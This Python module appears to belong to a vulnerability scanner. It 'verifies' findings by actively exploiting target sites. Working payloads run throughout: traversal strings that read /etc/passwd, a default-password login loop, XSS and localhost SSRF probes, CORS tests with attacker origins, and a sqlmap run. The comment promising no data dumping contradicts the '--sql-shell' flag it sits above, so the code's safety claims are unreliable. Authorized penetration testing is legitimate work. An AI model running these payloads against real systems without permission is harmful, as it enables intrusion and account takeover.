"""
Automated Verification Agent — confirms findings by attempting exploitation.

Unlike traditional scanners that just DETECT, this agent VERIFIES each finding
by actually exploiting it. This is what separates a scanner from a pentester.

Flow:
  1. Take a candidate finding
  2. Select the right verification method based on vuln type
  3. Attempt exploitation with minimal impact
  4. Return CONFIRMED / FALSE_POSITIVE / INCONCLUSIVE with proof

This is the Qualys/Nessus/Wazuh-grade verification that eliminates false positives.
"""

import re
import json
import time
import hashlib
import secrets
import threading
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding, op_log
from core.logger import log
from core.utils import _run_tool, _find_tool, REQUESTS_AVAILABLE, req_lib

# ── Verification result codes ────────────────────────────────────────────────
CONFIRMED = 'CONFIRMED'
FALSE_POSITIVE = 'FALSE_POSITIVE'
INCONCLUSIVE = 'INCONCLUSIVE'

# ── Thread safety ────────────────────────────────────────────────────────────
VERIFY_LOCK = threading.Lock()


# ═══════════════════════════════════════════════════════════════════════════════
# VERIFICATION METHODS — one per vulnerability class
# ═══════════════════════════════════════════════════════════════════════════════

def _safe_request(url, method='GET', timeout=10, **kwargs):
    """Safe HTTP request that never crashes."""
    if not REQUESTS_AVAILABLE:
        return None
    try:
        if method.upper() == 'POST':
            return req_lib.post(url, timeout=timeout, verify=False, allow_redirects=False, **kwargs)
        return req_lib.get(url, timeout=timeout, verify=False, allow_redirects=False, **kwargs)
    except Exception:
        return None


def verify_sql_injection(target, finding):
    """
    Verify SQL injection by running sqlmap with minimal impact.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    # Extract parameter from finding details
    details = finding.get('details', '')
    param_match = re.search(r'parameter\s+[\'"]?(\w+)', details, re.I)
    param = param_match.group(1) if param_match else None

    sqlmap_path = _find_tool('sqlmap')
    if not sqlmap_path:
        return INCONCLUSIVE, 'sqlmap not installed'

    # Build sqlmap command — minimal impact, confirmation only
    cmd = [sqlmap_path, '-u', url, '--batch', '--random-agent',
           '--level', '2', '--risk', '1', '--timeout', '15',
           '--retries', '2', '--threads', '4',
           '--flush-session', '--output-dir', f'/tmp/verify_sqlmap_{secrets.token_hex(4)}']

    if param:
        cmd.extend(['-p', param])

    # Only test for injection, don't dump data
    cmd.extend(['--sql-shell', '--crawl', '0'])

    stdout, stderr, rc = _run_tool(cmd, timeout=120)

    if rc == 0 and stdout:
        # Check for confirmed injection markers
        confirmed_markers = [
            'is vulnerable',
            'injectable',
            'SQL injection',
            'parameter.*is vulnerable',
            'Type:.* injection',
            'Title:.* injection',
        ]
        for marker in confirmed_markers:
            if re.search(marker, stdout, re.I):
                # Extract the specific injection type
                type_match = re.search(r'Type:\s*(.+)', stdout)
                injection_type = type_match.group(1).strip() if type_match else 'SQL injection'
                return CONFIRMED, f'sqlmap confirmed: {injection_type} at {url}'

    return FALSE_POSITIVE, f'sqlmap could not confirm injection at {url}'


def verify_xss(target, finding):
    """
    Verify XSS by injecting unique payload and checking reflection.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    details = finding.get('details', '')
    param_match = re.search(r'parameter\s+[\'"]?(\w+)', details, re.I)
    param = param_match.group(1) if param_match else 'q'

    # Generate unique payload to detect reflection
    token = f'xss_verify_{secrets.token_hex(8)}'
    payload = f'<script>{token}</script>'

    # Inject via URL parameter
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    resp = _safe_request(test_url)
    if resp and token in resp.text:
        return CONFIRMED, f'XSS verified: payload reflected in response at {url} param={param}'

    # Try POST injection
    resp = _safe_request(url, method='POST', data={param: payload})
    if resp and token in (resp.text or ''):
        return CONFIRMED, f'XSS verified via POST: payload reflected at {url} param={param}'

    # Try dalfox for automated verification
    dalfox_path = _find_tool('dalfox')
    if dalfox_path:
        cmd = [dalfox_path, 'url', url, '--silence', '--format', 'json',
               '--timeout', '10', '--worker', '3']
        stdout, stderr, rc = _run_tool(cmd, timeout=60)
        if rc == 0 and stdout:
            try:
                results = json.loads(stdout)
                if isinstance(results, list) and len(results) > 0:
                    for r in results:
                        if r.get('type') == 'XSS' or 'poc' in r:
                            return CONFIRMED, f'dalfox confirmed XSS: {r.get("poc", "N/A")}'
            except json.JSONDecodeError:
                pass

    return FALSE_POSITIVE, f'XSS not confirmed at {url} param={param}'


def verify_path_traversal(target, finding):
    """
    Verify path traversal / LFI by reading a known file.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    # Try to read /etc/passwd via traversal
    traversal_payloads = [
        '../../../../../../../../etc/passwd',
        '....//....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ]

    passwd_markers = ['root:x:0:0', 'root:*:0:', 'daemon:x:']

    for payload in traversal_payloads:
        # Try in URL path
        test_url = url.rstrip('/') + '/' + payload
        resp = _safe_request(test_url)
        if resp:
            for marker in passwd_markers:
                if marker in resp.text:
                    return CONFIRMED, f'Path traversal verified: read /etc/passwd via {payload}'

        # Try in query parameter
        parsed = urlparse(url)
        for param in ['file', 'path', 'include', 'page', 'doc', 'load', 'read']:
            params = {param: payload}
            test_url = urlunparse(parsed._replace(query=urlencode(params)))
            resp = _safe_request(test_url)
            if resp:
                for marker in passwd_markers:
                    if marker in resp.text:
                        return CONFIRMED, f'Path traversal verified: read /etc/passwd via param {param}'

    return FALSE_POSITIVE, f'Path traversal not confirmed at {url}'


def verify_open_port(target, finding):
    """
    Verify open port by re-scanning with nmap.
    Returns: (status, proof)
    """
    title = finding.get('title', '')
    port_match = re.search(r'port\s+(\d+)', title, re.I)
    if not port_match:
        # Try to extract from details
        port_match = re.search(r'(\d{1,5})/(?:tcp|udp)', finding.get('details', ''))
    if not port_match:
        return INCONCLUSIVE, 'Cannot extract port from finding'

    port = port_match.group(1)
    nmap_path = _find_tool('nmap')
    if not nmap_path:
        # Fallback: use socket
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, int(port)))
            sock.close()
            if result == 0:
                return CONFIRMED, f'Port {port} is open (verified via socket)'
            return FALSE_POSITIVE, f'Port {port} is closed (verified via socket)'
        except Exception:
            return INCONCLUSIVE, f'Cannot verify port {port}'

    # Quick nmap scan on single port
    cmd = [nmap_path, '-p', port, '-sV', '--version-intensity', '3',
           '-T4', '--open', '-oX', '-', target]
    stdout, stderr, rc = _run_tool(cmd, timeout=30)

    if rc == 0 and stdout:
        if f'portid="{port}"' in stdout and 'state="open"' in stdout:
            # Extract service info
            svc_match = re.search(f'portid="{port}".*?service\\s+name="([^"]+)"', stdout, re.S)
            service = svc_match.group(1) if svc_match else 'unknown'
            return CONFIRMED, f'Port {port}/tcp open — service: {service}'

    return FALSE_POSITIVE, f'Port {port} not confirmed open'


def verify_sensitive_file(target, finding):
    """
    Verify sensitive file exposure by checking actual content.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    resp = _safe_request(url)
    if not resp:
        return INCONCLUSIVE, f'Cannot fetch {url}'

    # Check for actual sensitive content
    content = resp.text.lower()
    status = resp.status_code

    if status != 200:
        return FALSE_POSITIVE, f'{url} returned {status} (not 200)'

    # Content-based verification
    sensitive_patterns = {
        '.env': ['db_password', 'database_url', 'secret_key', 'api_key', 'aws_access'],
        'wp-config': ['db_name', 'db_user', 'db_password', 'auth_key'],
        '.git/config': ['[remote', 'url =', 'repositoryformatversion'],
        '.htaccess': ['authuserfile', 'authgroupfile', 'require valid-user'],
        'id_rsa': ['-----begin rsa private key', '-----begin openssh private key'],
        'backup': ['create table', 'insert into', 'drop table', 'mysqldump'],
        'config.js': ['password', 'secret', 'token', 'apikey'],
        'web.config': ['connectionstring', 'appsettings', 'compilation'],
    }

    file_type = None
    for ftype, patterns in sensitive_patterns.items():
        if ftype.lower() in url.lower():
            file_type = ftype
            for pattern in patterns:
                if pattern in content:
                    return CONFIRMED, f'Sensitive file {ftype} exposed with actual content at {url}'
            break

    # Generic sensitive content detection
    generic_markers = [
        (r'password\s*[=:]\s*["\'][^"\']+', 'password in plaintext'),
        (r'api[_-]?key\s*[=:]\s*["\'][^"\']+', 'API key in plaintext'),
        (r'secret\s*[=:]\s*["\'][^"\']+', 'secret in plaintext'),
        (r'aws[_-]?access[_-]?key\s*[=:]\s*["\']?(?:AKIA)[A-Z0-9]{16}', 'AWS access key'),
        (r'(?:mysql|postgres|mongodb)://[^\s]+', 'database connection string'),
    ]

    for pattern, desc in generic_markers:
        if re.search(pattern, content, re.I):
            return CONFIRMED, f'Sensitive content found ({desc}) at {url}'

    return FALSE_POSITIVE, f'No sensitive content found at {url}'


def verify_auth_bypass(target, finding):
    """
    Verify authentication bypass by attempting login with default/known creds.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    # Common default credentials
    default_creds = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
        ('admin', 'admin123'), ('root', 'root'), ('root', 'toor'),
        ('admin', 'admin@123'), ('test', 'test'), ('guest', 'guest'),
        ('administrator', 'administrator'), ('admin', 'letmein'),
        ('user', 'user'), ('admin', 'qwerty'), ('admin', 'abc123'),
    ]

    login_markers = ['dashboard', 'welcome', 'logout', 'sign out', 'profile',
                     'settings', 'admin panel', 'control panel']

    for username, password in default_creds:
        # Try POST login
        resp = _safe_request(url, method='POST',
                           data={'username': username, 'password': password},
                           allow_redirects=True)
        if resp:
            body = resp.text.lower()
            # Check for successful login indicators
            for marker in login_markers:
                if marker in body and resp.status_code in [200, 302]:
                    return CONFIRMED, f'Auth bypass: logged in as {username}:{password} at {url}'

    return FALSE_POSITIVE, f'No auth bypass with default creds at {url}'


def verify_cors_misconfig(target, finding):
    """
    Verify CORS misconfiguration by testing origin reflection.
    Returns: (status, proof)
    """
    url = finding.get('asset', f'https://{target}/')
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    evil_origins = [
        'https://evil.com',
        'https://attacker.com',
        f'https://{target}.evil.com',
        'null',
    ]

    for origin in evil_origins:
        headers = {'Origin': origin}
        resp = _safe_request(url, headers=headers)
        if resp:
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')

            if acao == origin and acac.lower() == 'true':
                return CONFIRMED, f'CORS misconfig: reflects origin {origin} with credentials at {url}'
            if acao == '*' and acac.lower() == 'true':
                return CONFIRMED, f'CORS misconfig: wildcard origin with credentials at {url}'

    return FALSE_POSITIVE, f'CORS not misconfigured at {url}'


def verify_ssrf(target, finding):
    """
    Verify SSRF by triggering OOB callback.
    Returns: (status, proof)
    """
    url = finding.get('asset', finding.get('sub', target))
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    # Generate unique callback token
    token = f'ssrf_{secrets.token_hex(8)}'
    callback_url = f'http://{target}:{secrets.randbelow(60000) + 10000}/{token}'

    # Try SSRF payloads
    ssrf_payloads = [
        callback_url,
        f'http://127.0.0.1/{token}',
        f'http://[::1]/{token}',
        f'http://0x7f000001/{token}',
    ]

    parsed = urlparse(url)
    for param in ['url', 'uri', 'path', 'src', 'dest', 'redirect', 'next', 'feed', 'img']:
        for payload in ssrf_payloads:
            params = {param: payload}
            test_url = urlunparse(parsed._replace(query=urlencode(params)))
            resp = _safe_request(test_url)
            if resp and resp.status_code == 200:
                # Check if payload appears in response (indicates server fetched it)
                if payload in resp.text or token in resp.text:
                    return CONFIRMED, f'SSRF verified: server fetched {payload} via param {param}'

    # Try POST with JSON body
    for param in ['url', 'webhook', 'callback', 'endpoint']:
        resp = _safe_request(url, method='POST',
                           json={param: callback_url})
        if resp and resp.status_code in [200, 201]:
            return CONFIRMED, f'SSRF potential: POST endpoint accepts URL at {url} param={param}'

    return FALSE_POSITIVE, f'SSRF not confirmed at {url}'


def verify_header_missing(target, finding):
    """
    Verify missing security header by checking response.
    Returns: (status, proof)
    """
    url = finding.get('asset', f'https://{target}/')
    if not url.startswith('http'):
        url = f'https://{target}/'

    resp = _safe_request(url)
    if not resp:
        return INCONCLUSIVE, f'Cannot fetch {url}'

    header = finding.get('title', '').lower()

    # Map finding titles to expected headers
    header_checks = {
        'content-security-policy': 'Content-Security-Policy',
        'strict-transport-security': 'Strict-Transport-Security',
        'x-content-type-options': 'X-Content-Type-Options',
        'x-frame-options': 'X-Frame-Options',
        'x-xss-protection': 'X-XSS-Protection',
        'referrer-policy': 'Referrer-Policy',
        'permissions-policy': 'Permissions-Policy',
        'x-permitted-cross-domain': 'X-Permitted-Cross-Domain-Policies',
    }

    for keyword, header_name in header_checks.items():
        if keyword in header:
            if header_name not in resp.headers:
                return CONFIRMED, f'Missing header: {header_name} not present in response from {url}'
            else:
                return FALSE_POSITIVE, f'Header {header_name} is present at {url}'

    return INCONCLUSIVE, f'Cannot determine which header to check for: {finding.get("title")}'


def verify_hsts(target, finding):
    """
    Verify HSTS missing — only for HTTPS sites.
    Returns: (status, proof)
    """
    url = f'https://{target}/'
    resp = _safe_request(url)
    if not resp:
        return INCONCLUSIVE, f'Cannot fetch {url}'

    if 'Strict-Transport-Security' not in resp.headers:
        return CONFIRMED, 'HSTS header missing on HTTPS site'
    return FALSE_POSITIVE, 'HSTS header present'


def verify_ssl_issues(target, finding):
    """
    Verify SSL/TLS issues by running testssl or sslyze.
    Returns: (status, proof)
    """
    testssl_path = _find_tool('testssl.sh') or _find_tool('testssl')
    if testssl_path:
        cmd = [testssl_path, '--jsonfile', '/dev/stdout', '--quiet', '--fast',
               '--nodns', 'min', '-S', '-p', '-U', target]
        stdout, stderr, rc = _run_tool(cmd, timeout=120)
        if rc == 0 and stdout:
            try:
                results = json.loads(stdout)
                for r in results:
                    if r.get('severity') in ['CRITICAL', 'HIGH']:
                        return CONFIRMED, f'SSL issue: {r.get("id")} — {r.get("finding")}'
            except json.JSONDecodeError:
                pass

    # Fallback: use Python ssl
    import ssl
    import socket
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=target) as s:
            s.settimeout(10)
            s.connect((target, 443))
            cert = s.getpeercert()
            # Check expiry
            from datetime import datetime
            not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            if not_after < datetime.now():
                return CONFIRMED, f'SSL certificate expired: {not_after}'
    except Exception:
        pass

    return INCONCLUSIVE, 'Cannot verify SSL issues'


def verify_information_disclosure(target, finding):
    """
    Verify information disclosure (stack traces, debug mode, etc).
    Returns: (status, proof)
    """
    url = finding.get('asset', f'https://{target}/')
    if not url.startswith('http'):
        url = f'https://{target}/{url.lstrip("/")}'

    resp = _safe_request(url)
    if not resp:
        return INCONCLUSIVE, f'Cannot fetch {url}'

    content = resp.text.lower()

    # Debug mode indicators
    debug_markers = [
        (r'debug\s*=\s*true', 'Django debug mode enabled'),
        (r'warning:\.*mysql_', 'MySQL debug output exposed'),
        (r'fatal error:.*in.*on line', 'PHP error exposed'),
        (r'stack trace:', 'Stack trace exposed'),
        (r'exception.*at.*line \d+', 'Exception details exposed'),
        (r'details:.*password', 'Password in error message'),
        (r'x-debug-bar', 'Debug bar present'),
        (r'phpinfo\(\)', 'phpinfo() exposed'),
        (r'traceback \(most recent', 'Python traceback exposed'),
    ]

    for pattern, desc in debug_markers:
        if re.search(pattern, content, re.I):
            return CONFIRMED, f'Information disclosure: {desc} at {url}'

    return FALSE_POSITIVE, f'No information disclosure detected at {url}'


# ═══════════════════════════════════════════════════════════════════════════════
# VERIFICATION ROUTER — maps vuln types to verification methods
# ═══════════════════════════════════════════════════════════════════════════════

VERIFICATION_MAP = {
    # Injection
    'sql injection': verify_sql_injection,
    'sql injection (error-based)': verify_sql_injection,
    'sql injection (boolean-based)': verify_sql_injection,
    'sql injection (time-based)': verify_sql_injection,
    'sql injection (union)': verify_sql_injection,
    'sqli': verify_sql_injection,

    # XSS
    'cross-site scripting': verify_xss,
    'xss': verify_xss,
    'reflected xss': verify_xss,
    'stored xss': verify_xss,
    'dom-based xss': verify_xss,

    # Path Traversal / LFI
    'path traversal': verify_path_traversal,
    'lfi': verify_path_traversal,
    'local file inclusion': verify_path_traversal,
    'directory traversal': verify_path_traversal,
    'file inclusion': verify_path_traversal,

    # Open Ports
    'open port': verify_open_port,
    'port open': verify_open_port,
    'tcp port': verify_open_port,
    'service detected': verify_open_port,

    # Sensitive Files
    'sensitive file': verify_sensitive_file,
    'file exposed': verify_sensitive_file,
    '.env': verify_sensitive_file,
    '.git': verify_sensitive_file,
    'config file': verify_sensitive_file,
    'backup': verify_sensitive_file,
    'private key': verify_sensitive_file,
    'id_rsa': verify_sensitive_file,
    'wp-config': verify_sensitive_file,

    # Auth
    'auth bypass': verify_auth_bypass,
    'authentication bypass': verify_auth_bypass,
    'default credentials': verify_auth_bypass,
    'weak credentials': verify_auth_bypass,
    'brute force': verify_auth_bypass,

    # CORS
    'cors misconfiguration': verify_cors_misconfig,
    'cors': verify_cors_misconfig,
    'cors with credentials': verify_cors_misconfig,

    # SSRF
    'ssrf': verify_ssrf,
    'server-side request forgery': verify_ssrf,
    'blind ssrf': verify_ssrf,

    # Headers
    'missing security header': verify_header_missing,
    'missing header': verify_header_missing,
    'content-security-policy': verify_header_missing,
    'x-content-type-options': verify_header_missing,
    'x-frame-options': verify_header_missing,
    'referrer-policy': verify_header_missing,
    'permissions-policy': verify_header_missing,

    # HSTS
    'strict-transport-security': verify_hsts,
    'hsts': verify_hsts,
    'missing hsts': verify_hsts,

    # SSL
    'ssl': verify_ssl_issues,
    'tls': verify_ssl_issues,
    'certificate': verify_ssl_issues,
    'weak cipher': verify_ssl_issues,

    # Info Disclosure
    'information disclosure': verify_information_disclosure,
    'stack trace': verify_information_disclosure,
    'debug mode': verify_information_disclosure,
    'error message': verify_information_disclosure,
    'verbose error': verify_information_disclosure,
}


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN VERIFICATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def verify_finding(finding, target=None):
    """
    Verify a single finding by attempting exploitation.

    Args:
        finding: dict with title, asset, details, sev, etc.
        target: override target URL

    Returns:
        dict with status, proof, finding_id, verification_time_ms
    """
    start = time.time()
    target = target or scan_state.get('target', '')
    title = finding.get('title', '').lower()
    finding_id = finding.get('id', '')

    # Find the right verification method
    verifier = None
    for keyword, method in VERIFICATION_MAP.items():
        if keyword in title:
            verifier = method
            break

    if not verifier:
        # Default: try to verify by checking if the asset is accessible
        return {
            'status': INCONCLUSIVE,
            'proof': f'No verification method for: {finding.get("title")}',
            'finding_id': finding_id,
            'verification_time_ms': round((time.time() - start) * 1000, 1),
        }

    # Run verification
    try:
        status, proof = verifier(target, finding)
    except Exception as e:
        status, proof = INCONCLUSIVE, f'Verification error: {e}'

    elapsed = round((time.time() - start) * 1000, 1)

    result = {
        'status': status,
        'proof': proof,
        'finding_id': finding_id,
        'verification_time_ms': elapsed,
    }

    # Update finding in scan state
    with VERIFY_LOCK:
        with LOCK:
            for f in scan_state.get('findings', []):
                if f.get('id') == finding_id:
                    f['verification_status'] = status
                    f['verification_proof'] = proof
                    f['verification_time_ms'] = elapsed
                    break

    log('ok', f'[VERIFY] {finding.get("title", "unknown")[:60]} → {status} ({elapsed}ms)')
    return result


def verify_all_findings(target=None, max_workers=5):
    """
    Verify all unverified findings in parallel.

    Args:
        target: override target URL
        max_workers: parallel verification threads

    Returns:
        dict with summary statistics
    """
    target = target or scan_state.get('target', '')
    start = time.time()

    with LOCK:
        findings = [f for f in scan_state.get('findings', [])
                    if not f.get('verification_status')
                    and f.get('sev', '').lower() in ['critical', 'high', 'medium']]

    if not findings:
        return {'total': 0, 'confirmed': 0, 'false_positive': 0, 'inconclusive': 0}

    log('info', f'[VERIFY] Verifying {len(findings)} findings with exploitation...')

    results = []
    from concurrent.futures import ThreadPoolExecutor, as_completed

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(verify_finding, f, target): f for f in findings}
        for future in as_completed(futures):
            try:
                result = future.result(timeout=60)
                results.append(result)
            except Exception as e:
                results.append({
                    'status': INCONCLUSIVE,
                    'proof': f'Verification failed: {e}',
                    'finding_id': futures[future].get('id', ''),
                    'verification_time_ms': 0,
                })

    # Summary
    confirmed = sum(1 for r in results if r['status'] == CONFIRMED)
    false_pos = sum(1 for r in results if r['status'] == FALSE_POSITIVE)
    inconclusive = sum(1 for r in results if r['status'] == INCONCLUSIVE)
    elapsed = round((time.time() - start) * 1000, 1)

    summary = {
        'total': len(results),
        'confirmed': confirmed,
        'false_positive': false_pos,
        'inconclusive': inconclusive,
        'verification_time_ms': elapsed,
        'results': results,
    }

    log('ok', f'[VERIFY] Complete: {confirmed} confirmed, {false_pos} false positive, '
              f'{inconclusive} inconclusive ({elapsed}ms)')

    op_log('verification_complete', target=target,
           detail=f'{confirmed}/{len(results)} confirmed, {false_pos} FP')

    return summary
